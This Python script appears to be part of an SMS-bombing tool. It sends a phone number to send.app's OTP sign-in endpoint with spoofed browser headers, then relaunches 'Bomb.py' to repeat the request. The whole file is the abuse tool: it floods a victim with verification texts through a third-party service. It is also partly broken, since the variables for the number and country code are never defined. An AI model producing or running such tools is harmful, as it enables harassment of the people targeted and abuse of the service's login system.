import requests
import json,os,time
from user_agent import generate_user_agent
from rich import print
from time import sleep
from rich.progress import track
from rich.panel import Panel
from number import nums
from number import logo
import re
for i in track(range(20),description='Wait...'):
	sleep(.1)
	pass
os.system('clear')
print(logo)
B=countrycode
A=number
url = "https://send.app/api/trpc/auth.signInWithOtp"
params = {
	'batch': "1"
	}
	
payload = json.dumps({
	"0": {
		"json": {
		"phone": A,
		"countrycode": B
		}
	}
	})
	
headers = {
	'User-Agent':generate_user_agent(),
	#'Accept-Encoding': "gzip, deflate, br, zstd",
	'Content-Type': "application/json",
	'sec-ch-ua': "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
	'sec-ch-ua-platform': "\"Android\"",
	'sec-ch-ua-mobile': "?1",
	'origin': "https://send.app",
	'sec-fetch-site': "same-origin",
	'sec-fetch-mode': "cors",
	'sec-fetch-dest': "empty",
	'referer': "https://send.app/auth/sign-in",
	'accept-language': "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	'priority': "u=1, i"
	}
response = requests.post(url, params=params, data=payload, headers=headers).text
if re.search('data',str(response)):
	print(Panel(f'GOOD Sended to {A} ',title='[green]GOOD'))
	os.system('python Bomb.py')
else:
	print(Panel(f'BAD Not sended to {A} ',title='[red]BAD '))
	os.system('python Bomb.py')
		
